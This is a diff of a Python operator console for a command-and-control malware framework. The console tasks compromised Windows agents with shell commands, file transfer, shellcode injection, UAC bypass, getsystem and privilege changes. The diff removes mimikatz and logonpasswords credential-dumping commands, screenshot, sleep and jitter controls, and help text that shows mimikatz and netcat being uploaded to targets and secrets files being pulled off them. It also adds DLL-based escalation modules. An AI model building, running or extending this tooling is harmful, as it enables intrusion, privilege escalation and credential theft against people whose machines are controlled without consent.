@@ -6,7 +6,6 @@ from pathlib import Path
 from pprint import pprint
 import toml
 import time
-import cmd
 
 mysettings_server = ''
 
@@ -18,7 +17,7 @@ except:
 
 menu = 1
 prompt = "> "
-current_agent = ""
+currentAgent = ""
 
 # Define an enumeration subclass Enum
 from enum import Enum
@@ -50,28 +49,20 @@ class tasktype(Enum):
     RemoteInject = 11
     BypassUAC = 12
     Getsystem = 13
-    Screenshot = 14
-    Jitter = 15
-    Mimikatz = 16
 
 base_commands = {
-    "help       " : "print this info",
-    "agents     " : "agents information",
-    "alias       ": "create command alias",
-    "load_aliases": "load aliases from file",
-    "quit       " : "exit from the console"
+    "help" : "print this info",
+    "agents" : "agents information",
+    "quit" : "exit from the console"
 }
 
 agents_commands = {
-    "list       " : "list all agents",
-    "dropdb     " : "delete all data from the db",
-    "alias       ": "create command alias",
-    "load_aliases": "load aliases from file",
-    "debugreports": "show debugging detection reports for all agents",
-    "use        " : "connect to a specific agent",
-    "help       " : "print this info",
-    "back       " : "go back to the main menu",
-    "quit       "  : "same as back"
+    "list" : "list all agents",
+    "dropdb" : "delete all data from the db",
+    "use" : "connect to a specific agent",
+    "help" : "print this info",
+    "back" : "go back to the main menu",
+    "quit" : "same as back"
 }
 
 agent_interactive_commands = {
@@ -80,10 +71,8 @@ agent_interactive_commands = {
     "sysinfo" : "basic agent details",
     "shell" : "execute os command",
     "ps": "print list of running processes",
-    "debugreports": "show debugging detection reports for this agent",
     "pwd" : "print current working directory",
     "cd" : "change directory",
-    "upload": "upload a file to the Server. ex: upload /tmp/test.txt C:\\test.txt",
     "download": "download a file. ex download C:\\LargeFiles\\100MB.zip",
     "listprivs": "listprivs",
     "setpriv": "enable or disable a priv. ex: setpriv SeDebug enabled",
@@ -95,22 +84,8 @@ agent_interactive_commands = {
     "resource": "run a cmds from a file. RC file local to the CLI. one cmd per line. ex: resource [cmds.rc]",
     "bypassuac": "spawn a High integrity cmd.exe using UAC bypass",
     "getsystem": "spawn a SYSTEM cmd using getsystem",
-    "screenshot": "gets a screenshot of the users Desktop",
-    "sleep": "sleep <seconds> <jitter-max> (jitter-min)",
-    "alias": "create command alias",
-    "load_aliases": "load aliases from file",
-    "mimikatz"   : "run mimikatz sRDI module: mimikatz \"<module>::<command>;...\"",
-    "logonpasswords": "alias for mimikatz sekurlsa::logonpasswords",
     "quit" : "same as back"
 }
-
-def save_aliases_to_file(alias_file, aliases):
-    try:
-        with open(alias_file, 'w') as f:
-            for name, cmd_str in aliases.items():
-                f.write(f"{name}={cmd_str}\n")
-    except Exception as e:
-        print(f"Failed to save aliases: {e}")
 
 def print_task_type(task_type):
     match task_type:
@@ -138,24 +113,6 @@ def print_task_type(task_type):
             print("RemoteInject")
         case _:
             print("Unknown")
-
-def api_debug_reports():
-    global mysettings_server
-    url = f"http://{mysettings_server}/admin/api/debug_reports"
-    r = requests.get(url, timeout=60)
-    if r.status_code == 200:
-        return r.json()
-    else:
-        return None
-
-def api_agent_debug_reports(agent_id):
-    global mysettings_server
-    url = f"http://{mysettings_server}/admin/api/debug_reports/{agent_id}"
-    r = requests.get(url, timeout=60)
-    if r.status_code == 200:
-        return r.json()
-    else:
-        return None
         
 def api_task_details(task_id):
     global mysettings_server
@@ -258,25 +215,6 @@ def print_agents(agents):
             if len(agents) > 1:    
                 print("-------")
     print("--------------------------------------------------")
-    
-def print_debug_reports(reports):
-    if reports is None:
-        print("Could not connect to server.")
-        return
-    if len(reports) == 0:
-        print("\nNo debug reports found.\n")
-        return
-        
-    print("\n--- Debug Detection Reports ---")
-    print(f"{'ID':<5} {'Agent ID':<10} {'Debugging':<10} {'Timestamp':<25}")
-    print("-" * 55)
-    
-    for report in reports:
-        debug_status = "⚠️ DETECTED" if report["debug_detected"] else "None"
-        print(f"{report['id']:<5} {report['agent_id']:<10} {debug_status:<10} {report['timestamp']}")
-    
-    print("-" * 55)
-    print("")
 
 def print_task_details(task):
     if task == None:
@@ -372,56 +310,8 @@ def agent_send_bypassuac_cmd(args):
     # Build the task input string: include the method and then the command
     input_str = method + " " + cmd_args
     # Send the task with type BypassUAC (12)
-    agent_send_cmd(tasktype.BypassUAC.value, input_str)
-    
-def help_debugreports(self, arg):
-    """Provides detailed help for the debugreports command."""
-    print("")
-    print("Command: debugreports")
-    print("--------------------")
-    print("Description: Shows anti-debugging detection reports from agents.")
-    print("             Helps identify if agents are being analyzed or debugged.")
-    print("")
-    print("Usage:")
-    print("  debugreports            - Show reports for the current agent (in agent context)")
-    print("  agents > debugreports   - Show reports for all agents (in agents menu)")
-    print("")
-    print("What's reported:")
-    print("  - Detection timestamp")
-    print("  - Whether a debugger was detected")
-    print("  - Agent ID")
-    print("")
-    print("Anti-debugging techniques used:")
-    print("  - PEB BeingDebugged flag check")
-    print("  - Windows API IsDebuggerPresent()")
-    print("  - Debug port check via NtQueryInformationProcess")
-    print("  - Timing analysis for debugger overhead")
-    print("")
-    
-def help_download(self, arg):
-    """Provides detailed help for the download command."""
-    print("")
-    print("Command: download")
-    print("-----------------")
-    print("Description: Downloads a file from the compromised host to the C2 server.")
-    print("             The file is retrieved from the target system and stored on the C2 server.")
-    print("")
-    print("Usage: download <remote_file_path>")
-    print("")
-    print("Parameters:")
-    print("  remote_file_path - Full path to the file on the target system to download")
-    print("")
-    print("Examples:")
-    print("  download C:\\Windows\\System32\\drivers\\etc\\hosts")
-    print("  download C:\\Users\\Administrator\\Desktop\\secrets.txt")
-    print("  download /etc/passwd          # On Linux targets")
-    print("")
-    print("Notes:")
-    print("- Downloaded files are stored in the server's data/<agent_id>/upload directory")
-    print("- Large files may take time to transfer depending on connection speed")
-    print("- The remote path must be accessible to the agent process")
-    print("")
-
+    dll_path = "cli/modules/bypassuac_fodhelper_x64.dll"
+    agent_send_host_download_file_exec(tasktype.BypassUAC.value, dll_path, input_str)
     
 def agent_send_getsystem_cmd(args):
 
@@ -437,15 +327,9 @@ def agent_send_getsystem_cmd(args):
     cmd_args = " ".join(tokens[1:])
     input_str = method + " " + cmd_args
     # Send task with getsystem type (13)
-    agent_send_cmd(tasktype.Getsystem.value, input_str)
-    
-def agent_send_screenshot_cmd():
-    # Build and send a task of type 14 (screenshot)
-    agent_send_cmd(14, "")
+    dll_path = "cli/modules/getsystem_pipe_x64.dll"
+    agent_send_host_download_file_exec(tasktype.Getsystem.value, dll_path, input_str)
 
-def agent_send_sleep_cmd(args):
-    # 'args' will be the string containing sleep time and jitter percentages (e.g., "10 30" or "10 40 30")
-    agent_send_cmd(15, args)
 
 def agent_send_host_download_file_exec(type,path,input):
     json_data = {   'agent_id': current_agent, 
@@ -594,22 +478,13 @@ def print_agent_interactive_help():
             print(i,"\t:", agent_interactive_commands[i])
         else:
             print(i,"\t\t:", agent_interactive_commands[i])
-            
-def agent_send_mimikatz_cmd(args):
-    """Wraps tasktype 16: run mimikatz sRDI module."""
-    if not args.strip():
-        print("Usage: mimikatz \"<module>::<command1>;<module>::<command2>;...\"")
-        return
-    agent_send_cmd(tasktype.Mimikatz.value, args)
 
 #
 # main menu 1
 # agents 2
 # interactive agent 3
 #
-
 def parseInput(inputstr):
-    global menu, prompt, current_agent
     if inputstr == "quit" or inputstr == "back" or inputstr == "exit":
         if menu == 1:
             sys.exit(0)
@@ -617,8 +492,6 @@ def parseInput(inputstr):
             set_main_menu()
         elif menu == 3: 
             set_agent_menu()
-        return 
-    
     elif inputstr == "help":
         if menu == 1:
             print_main_menu_help()
@@ -631,121 +504,77 @@ def parseInput(inputstr):
             print("")   
         else:
             print("")
-        return 
-    
     elif inputstr == "agents":
         set_agent_menu()
-        return 
     elif menu == 2:
         if inputstr == "list":
             list_agents()
-            return
         if inputstr == "dropdb":
             api_dropdb()
-            return
         elif inputstr.startswith("use "):
             agent_id = inputstr.replace('use ', '')
             use_agent(agent_id)
-            return
-        elif inputstr == "debugreports":
-            reports = api_debug_reports()
-            print_debug_reports(reports)
-            return
-        
     elif menu == 3:
         if inputstr == "sysinfo":
             agent_sysinfo()
-            return
         elif inputstr == "terminate":
             agent_send_terminate_cmd()
-            return
         elif inputstr.startswith("shell "):
             shell_cmd = inputstr.replace('shell ', '')
             agent_send_shell_cmd(shell_cmd)
-            return
         elif inputstr == "pwd":
             agent_send_pwd_cmd()
-            return
-        elif inputstr == "debugreports":
-            reports = api_agent_debug_reports(current_agent)
-            print_debug_reports(reports)
-            return
         elif inputstr == "getuid" or inputstr == "whoami":
             agent_send_getuid_cmd()
-            return
         elif inputstr == "ps":
             agent_send_ps_cmd()
-            return
         elif inputstr.startswith("cd "):
             cd_dir = inputstr.replace('cd ', '')
             agent_send_cd_cmd(cd_dir)
-            return
         elif inputstr.startswith("bypassuac"):
             # Remove the command name and any leading spaces
             args = inputstr[len("bypassuac"):].strip()
             if not args:
                 print("Usage: bypassuac [method] [cmd w/ args]")
-                return
             else:
                 agent_send_bypassuac_cmd(args)
-                return
         elif inputstr.startswith("getsystem"):
             args = inputstr[len("getsystem"):].strip()
             if not args:
                 print("Usage: getsystem [method] [cmd w/ args]")
-                return
             else:
                 agent_send_getsystem_cmd(args)
-                return
         ##
         ## we flip the perspective here for upload and download
         ##
         elif inputstr.startswith("download "):
             upload_path = inputstr.replace('download ', '')
             agent_send_upload_cmd(upload_path)
-            return
         elif inputstr.startswith("upload "):
             uploadfile_input = inputstr.replace('upload ', '')
             srv_path = uploadfile_input.split(" ")[0]
             dst_path = uploadfile_input.split(" ")[-1]
             agent_send_download_cmd(srv_path,dst_path) 
-            return
         elif inputstr == "listprivs":
             agent_send_listprivs_cmd()
-            return
         elif inputstr.startswith("setpriv "):
             setpriv_cmd = inputstr.replace('setpriv ', '')
             tokens = setpriv_cmd.split(" ")
             if len(tokens) != 2:
                 print("Usage: setpriv <Privilege> <enabled|disabled>")
-                return
             else:
                 priv, state = tokens[0], tokens[1]
                 if state not in ["enabled", "disabled"]:
                     print("Invalid state. State should be 'enabled' or 'disabled'.")
-                    return
                 else:
                     dll_path = "cli/modules/setpriv/setpriv_x64.dll"
                     input_args = priv + " " + state
                     agent_send_host_download_file_exec(tasktype.SetPriv.value, dll_path, input_args)
-                    return
-        elif inputstr == "screenshot":
-            agent_send_screenshot_cmd()
-            return
-        elif inputstr.startswith("sleep"):
-            args = inputstr.replace("sleep", "", 1).strip()
-            if not args:
-                print("Usage: sleep <seconds> <jitter-max> (jitter-min)")
-                return
-            else:
-                agent_send_sleep_cmd(args)
-                return
         elif inputstr.startswith("scinject "):
             scinject_cmd = inputstr.replace('scinject ', '')
             file = scinject_cmd.split(" ")[0]
             processOrpid = scinject_cmd.split(" ")[1]
             agent_send_host_download_file_exec(tasktype.RemoteInject.value,file,processOrpid)
-            return
         elif inputstr.startswith("resource "):
             autoruncmds = []
             resource_cmd = inputstr.replace('resource ', '')
@@ -760,24 +589,13 @@ def parseInput(inputstr):
                 f.close()
                 for cmd in autoruncmds:
                     parseInput(cmd)
-                return
         elif inputstr == "history" or inputstr == "tasks":
             agent_history()
-            return
         elif inputstr.startswith("task "):
             task_id = inputstr.replace('task ', '')
             print(task_id)
             agent_task_details(task_id)
-            return
-        elif inputstr.startswith("mimikatz "):
-            argstr = inputstr[len("mimikatz "):].strip()
-            agent_send_mimikatz_cmd(argstr)
-            return
-        elif inputstr == "logonpasswords":
-            # shorthand alias
-            agent_send_mimikatz_cmd("sekurlsa::logonpasswords")
-            return
-'''
+
 while True:
     try:
         inputstr = str(input(prompt))
@@ -789,122 +607,3 @@ while True:
         sys.exit()
     except EOFError as err:
         sys.exit()
-'''
-
-
-class C2CLI(cmd.Cmd):
-    """Command-line interface for C2 operations with autocomplete and alias support."""
-    intro = "Welcome to the C2 CLI. Type help or ? to list commands."
-    prompt = "> "
-
-    def __init__(self):
-        super().__init__()
-        # Alias mapping and file
-        self.aliases = {}
-        self.alias_file = "aliases.cfg"
-        self.do_load_aliases(self.alias_file)
-        # Sync prompt with global state
-        self.prompt = prompt
-        
-        
-    def do_help(self, arg):
-        if arg == "download":
-            self.help_download(None)
-        elif arg == "upload":
-            self.help_upload(None)
-        elif arg == "debugreports":
-            self.help_debugreports(None)
-        else:
-            # Call the original help function for general help
-            parseInput('help')
-    
-    def help_upload(self, arg):
-        """Provides detailed help for the upload command."""
-        print("")
-        print("Command: upload")
-        print("---------------")
-        print("Description: Uploads a file from the C2 server to the compromised host.")
-        print("             The file is transferred from the server to the specified location on the target system.")
-        print("")
-        print("Usage: upload <local_file_path> <remote_destination_path>")
-        print("")
-        print("Parameters:")
-        print("  local_file_path       - Path to the file on the C2 server to upload")
-        print("  remote_destination_path - Full path where the file should be saved on the target system")
-        print("")
-        print("Examples:")
-        print("  upload ./payloads/mimikatz.exe C:\\Windows\\Temp\\mk.exe")
-        print("  upload ./tools/netcat.exe C:\\Users\\Public\\nc.exe")
-        print("  upload ./scripts/recon.ps1 C:\\Scripts\\recon.ps1")
-        print("")
-        print("Notes:")
-        print("- The destination directory must exist and be writable by the agent process")
-        print("- The upload process may fail if the target path requires elevated permissions")
-        print("- Local paths can be relative to the current directory of the CLI")
-        print("")
-
-    def do_alias(self, arg):
-        """Create an alias: alias <name> <command>"""
-        parts = arg.split(None, 1)
-        if len(parts) != 2:
-            print("Usage: alias <name> <command>")
-            return
-        name, command = parts
-        self.aliases[name] = command
-        save_aliases_to_file(self.alias_file, self.aliases)
-        print(f"Alias '{name}' -> '{command}' created and saved.")
-
-    def do_load_aliases(self, arg):
-        """Load aliases from a file: load_aliases [file]"""
-        filename = arg.strip() or self.alias_file
-        try:
-            with open(filename) as f:
-                for line in f:
-                    if line.strip() and not line.startswith('#') and '=' in line:
-                        n,c = line.split('=',1)
-                        self.aliases[n.strip()] = c.strip()
-            print(f"Loaded aliases from {filename}.")
-        except Exception as e:
-            print(f"Failed to load aliases: {e}")
-
-    def complete_load_aliases(self, text, line, begidx, endidx):
-        return [p.name for p in Path('.').iterdir() if p.is_file() and p.name.startswith(text)]
-
-    def default(self, line):
-        """Handle commands, including aliases."""
-        # Handle aliased commands
-        parts = line.split()
-        if parts and parts[0] in self.aliases:
-            aliased = self.aliases[parts[0]]
-            line = aliased + (' ' + ' '.join(parts[1:]) if len(parts)>1 else '')
-        
-        # Process the command
-        parseInput(line)
-        # update CLI prompt if changed by parseInput
-        self.prompt = prompt
-        return False
-
-    def completenames(self, text, *ignored):
-        cmds = [n[3:] for n in self.get_names() if n.startswith('do_')]
-        return [c for c in cmds + list(self.aliases) if c.startswith(text)]
-
-    def complete_use(self, text, line, begidx, endidx):
-        agents = api_agents() or []
-        ids = [str(a['id']) for a in agents]
-        return [i for i in ids if i.startswith(text)]
-
-    def do_EOF(self, arg):
-        print("Exiting.")
-        return True
-
-    def do_exit(self, arg):
-        print("Exiting.")
-        return True
-    
-    def do_agents(self, arg):
-        """agents: switch to agents menu"""
-        parseInput('agents')
-
-if __name__ == '__main__':
-    C2CLI().cmdloop()
-
